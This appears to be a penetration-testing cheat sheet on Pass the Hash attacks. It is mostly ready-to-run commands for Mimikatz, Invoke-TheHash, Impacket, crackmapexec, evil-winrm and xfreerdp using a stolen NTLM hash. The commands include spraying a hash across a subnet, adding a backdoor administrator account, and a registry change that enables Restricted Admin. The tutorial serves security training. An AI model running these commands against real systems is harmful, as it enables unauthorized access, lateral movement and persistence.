A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication.
# Windows 
## Mimikatz
For perform this techniques from a Windows Host we can use [Mimikatz](https://github.com/gentilkiwi).
```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /rc4:<HASH> /domain:<domain> /run:cmd.exe" exit
```

We can use _/NTLM_ opposite to _/rc4_
## Invoke-TheHash
Another tool we can use to perform Pass the Hash attacks on Windows is [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash).
This tool is a collection of PowerShell functions for performing Pass the Hash attacks with _WMI_ and _SMB_.
Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer. 
```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <IP> -Domain <Domain> -Username <Users> -Hash <Hash> -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
# Linux 
## Impacket
[Impacket](https://github.com/SecureAuthCorp/impacket) has several tools we can use for different operations such as `Command Execution` and `Credential Dumping`, `Enumeration`, etc.
```bash
impacket-psexec <User>@<IP> -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:
- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)
## NXC
```bash
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command.
## Evil-Winrm
```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

With Domain Account:
```bash
evil-winrm -i 10.129.201.126 -u administrator@<Domain> -H 30B3783CE2ABF1AF70F77D0660CF3453
```
## xFreeRDP
There are a few caveats to this attack:

- `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with a error.
This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
xfreerdp  /v:<IP> /u:<USER> /pth:<HASH>
```

# UAC Limits Pass the Hash for Local Accounts
UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.

**Note:** There is one exception, if the registry key `FilterAdministratorToken` (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.

These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. If you want to learn more about LocalAccountTokenFilterPolicy, you can read Will Schroeder's blog post [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167).
